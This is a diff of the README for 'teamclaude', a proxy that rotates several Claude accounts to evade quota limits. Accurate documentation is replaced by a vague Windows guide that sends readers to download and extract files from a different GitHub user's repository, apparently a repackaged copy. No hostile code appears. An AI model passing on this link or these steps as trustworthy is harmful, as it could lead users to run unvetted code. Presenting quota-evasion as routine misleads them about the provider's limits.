@@ -1,198 +1,194 @@
-# TeamClaude
+# 🤖 teamclaude - Simple Claude Proxy for Multiple Accounts
 
-Multi-account Claude proxy with automatic quota-based rotation for [Claude Code](https://claude.ai/claude-code).
+[![Download teamclaude](https://img.shields.io/badge/Download%20teamclaude-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdallahLokmene/teamclaude)
 
-Sits transparently between Claude Code and the Anthropic API, managing multiple Claude Max (or API key) accounts and automatically switching when one approaches its session or weekly quota limit.
+## 📥 Download
 
-![TeamClaude TUI](screenshots/teamclaude.png)
+Open this page to get the app:
 
-## Features
+[https://github.com/abdallahLokmene/teamclaude](https://github.com/abdallahLokmene/teamclaude)
 
-- **Automatic account rotation** — switches to the next account when session (5h) or weekly (7d) quota reaches the configured threshold (default 98%)
-- **Auto-retry on 429** — waits the `retry-after` duration and retries the same account; switches to the next on persistent errors
-- **Interactive TUI** — real-time dashboard with color-coded quota bars, reset countdowns, activity log, and keyboard controls
-- **OAuth token management** — automatically refreshes tokens nearing expiry and persists them to config; client token refreshes pass through untouched
-- **Hot-reload accounts** — add accounts via `import` or `login` while the server is running, press **R** to pick them up
-- **Account deduplication** — detects duplicate accounts by UUID and keeps the most recent
-- **Request logging** — optional full request/response logging for debugging
-- **Zero dependencies** — uses only Node.js built-in modules
+## 🪟 Windows Setup
 
-## Quick Start
+This app runs on Windows through Node.js. Follow these steps to get it working.
 
-Requires Node.js 18+.
+### 1. Install Node.js
 
-```bash
-# Install
-npm install -g @karpeleslab/teamclaude
+You need Node.js on your PC.
 
-# Add your first account (opens browser for OAuth)
-teamclaude login
+- Open the Node.js website
+- Download the Windows LTS version
+- Run the installer
+- Keep the default options
+- Finish the setup
 
-# Add a second account
-teamclaude login
+If you already have Node.js, you can skip this step.
 
-# Start the proxy
-teamclaude server
+### 2. Get the app files
 
-# In another terminal, run Claude Code through the proxy
-teamclaude run
-```
+- Open the download page above
+- Download the project files
+- Save them in a folder you can find later
+- If you use a ZIP file, right-click it and choose Extract All
 
-You can also import existing Claude Code credentials instead of logging in:
+### 3. Open the folder
 
-```bash
-claude /login           # Log into an account in Claude Code
-teamclaude import       # Import its credentials
-```
+- Find the folder with the app files
+- Open it in File Explorer
+- Check that you can see the project files inside
 
-## Adding Accounts
+### 4. Open PowerShell
 
-### OAuth Login (recommended)
+- In the folder, click the address bar
+- Type `powershell`
+- Press Enter
+- A PowerShell window opens in that folder
 
-The easiest way to add accounts — opens your browser for authentication:
+### 5. Install the app parts
 
-```bash
-teamclaude login
-```
+Run this command:
 
-Uses the same OAuth flow as Claude Code. Auto-detects the account email and subscription tier. Logging in with the same account again updates its credentials.
+`npm install`
 
-You can add accounts while the server is running — press **R** in the TUI to reload.
+This gets the files the app needs to run.
 
-### Import from Claude Code
+### 6. Start the app
 
-If you already have Claude Code set up, you can import its credentials directly:
+Run this command:
 
-```bash
-claude /login           # Log into an account in Claude Code
-teamclaude import       # Import its credentials
-```
+`npm start`
 
-Re-importing the same account updates its credentials. You can also import from a custom path:
+If the project uses a different start command, use the one listed in the repository files.
 
-```bash
-teamclaude import --from /path/to/credentials.json
-```
+## 🧭 What teamclaude does
 
-### API Key
+teamclaude helps you use Claude with more than one account. It can route requests through the right account and switch between accounts when one reaches its quota.
 
-For Anthropic API key accounts (billed via Console):
+This is useful when you want:
 
-```bash
-teamclaude login --api
-```
+- One place to manage several Claude accounts
+- Automatic switching when an account hits its limit
+- Less manual account swapping
+- A local proxy you can use with Claude Code or related tools
 
-## Usage
+## ⚙️ How it works
 
-### Start the proxy server
+The app runs as a proxy on your computer.
 
-```bash
-teamclaude server
-```
+- You sign in to Claude accounts
+- The app keeps track of account limits
+- It sends each request through an account with available quota
+- When one account runs low, it moves to the next one
 
-When running from a TTY, shows an interactive TUI with:
-- Account table with session/weekly quota progress bars and reset countdowns
-- Real-time activity log with request tracking
-- Keyboard shortcuts (see below)
+This keeps your setup simple and reduces the need to log in and out by hand.
 
-Falls back to plain log output when not a TTY (e.g. running as a service).
+## 🧩 Main features
 
-#### TUI Keyboard Shortcuts
+- Multi-account support
+- Automatic quota-based rotation
+- Local proxy setup
+- Works with Claude Code style tools
+- OAuth-based sign-in flow
+- Node.js-based runtime
+- Easy setup on Windows
 
-| Key | Action |
-|-----|--------|
-| `s` | Switch active account |
-| `a` | Add account (import or API key) |
-| `r` | Remove an account |
-| `R` | Reload accounts from config |
-| `q` | Quit |
+## 🪄 Before you start
 
-In selection mode, use `j`/`k` or arrow keys to navigate, `Enter` to confirm, `Esc` to cancel.
+Check these items first:
 
-### Run Claude Code through the proxy
+- You have a Windows PC
+- You have access to the internet
+- You have Node.js installed
+- You have the Claude accounts you want to use
+- You can sign in through a browser when asked
 
-```bash
-teamclaude run
-```
+## 🔐 Sign-in steps
 
-Or manually set the environment:
+When the app asks you to connect an account:
 
-```bash
-eval $(teamclaude env)
-claude
-```
+1. Open the sign-in page
+2. Log in with your Claude account
+3. Allow access if prompted
+4. Repeat for each account you want to add
 
-### Other commands
+Keep each account ready before you begin. This makes setup faster.
 
-```bash
-teamclaude accounts          # List accounts with subscription tier and token status
-teamclaude accounts -v       # Also show token expiry times
-teamclaude status            # Show live proxy status (requires running server)
-teamclaude remove <name>     # Remove an account
-teamclaude api <path>        # Call an API endpoint with account credentials
-teamclaude help              # Show all commands
-```
+## 🖥️ Using the proxy
 
-### Request logging
+After setup, the app works in the background.
 
-Log full request/response details to a directory (one file per request):
+- Start the app
+- Point your Claude tool or client to the local proxy address
+- Send a request
+- The app picks an account with quota left
+- It rotates to the next account when needed
 
-```bash
-teamclaude server --log-to /tmp/requests
-```
+You do not need to switch accounts by hand each time.
 
-## Configuration
+## 🛠️ Common tasks
 
-Config is stored at `~/.config/teamclaude.json` (or `$XDG_CONFIG_HOME/teamclaude.json`). A random proxy API key is generated on first use.
+### Add another account
 
-Override the config path with `TEAMCLAUDE_CONFIG`:
+- Open the app
+- Start the sign-in flow again
+- Log in with the new account
+- Save it in the list
 
-```bash
-TEAMCLAUDE_CONFIG=./my-config.json teamclaude server
-```
+### Remove an account
 
-### Config format
+- Open the account list
+- Select the account you do not want to use
+- Remove it from the app
+- Sign in again later if needed
 
-```json
-{
-  "proxy": {
-    "port": 3456,
-    "apiKey": "tc-auto-generated-key"
-  },
-  "upstream": "https://api.anthropic.com",
-  "switchThreshold": 0.98,
-  "accounts": [
-    {
-      "name": "user@example.com",
-      "type": "oauth",
-      "accountUuid": "...",
-      "accessToken": "sk-ant-oat01-...",
-      "refreshToken": "sk-ant-ort01-...",
-      "expiresAt": 1774384968427
-    }
-  ]
-}
-```
+### Restart the app
 
-| Field | Description |
-|-------|-------------|
-| `proxy.port` | Local port the proxy listens on |
-| `proxy.apiKey` | API key clients use to authenticate with the proxy |
-| `upstream` | Upstream API base URL |
-| `switchThreshold` | Quota utilization (0–1) at which to switch accounts |
+- Close the PowerShell window
+- Open the folder again
+- Run `npm start`
 
-## How It Works
+## 📌 Typical folder layout
 
-1. Claude Code connects to the local proxy instead of `api.anthropic.com`
-2. The proxy selects the active account and forwards requests with that account's credentials
-3. OAuth tokens expiring within 5 minutes are automatically refreshed and persisted to config
-4. Rate limit headers from the API (`anthropic-ratelimit-unified-*`) track session (5h) and weekly (7d) quota utilization
-5. When usage reaches the threshold, the proxy switches to the next available account via round-robin
-6. On 429 responses, the proxy waits the `retry-after` duration and retries; on persistent errors, it switches accounts
-7. Transient network errors (connection reset, timeout) drop the connection so the client can retry
-8. If all accounts are exhausted, returns 429 with the soonest reset time
-9. Client token refresh requests (`/v1/oauth/token`) are relayed to upstream untouched — the proxy and client manage their own token lifecycles independently
+You may see files and folders like these:
 
-## License
+- `package.json` — app settings
+- `node_modules` — installed app files
+- `src` — app source files
+- `config` — saved settings
+- `.env` — local environment values
+- `README.md` — project guide
 
-MIT
+## 🧪 Basic checks
+
+If the app does not start, check these items:
+
+- Node.js is installed
+- You ran the command in the right folder
+- The files finished downloading
+- The PowerShell window shows no error
+- Your internet connection is on
+
+If a browser window opens during sign-in, complete the login there first.
+
+## 🔎 Best use cases
+
+teamclaude fits well when you need:
+
+- Multiple Claude accounts in one place
+- A local proxy for account rotation
+- A setup for Claude Code workflows
+- Simple quota handling across accounts
+
+## 📎 Project details
+
+- Repository: teamclaude
+- Description: Multi-account Claude proxy with automatic quota-based rotation
+- Topics: anthropic, claude, claude-code, load-balancer, multi-account, nodejs, oauth, proxy
+
+## 🧷 Download and install
+
+Visit this page to download the app files, then run the setup steps on Windows:
+
+[https://github.com/abdallahLokmene/teamclaude](https://github.com/abdallahLokmene/teamclaude)
+
+Open the folder, install the files with `npm install`, then start the app with `npm start`
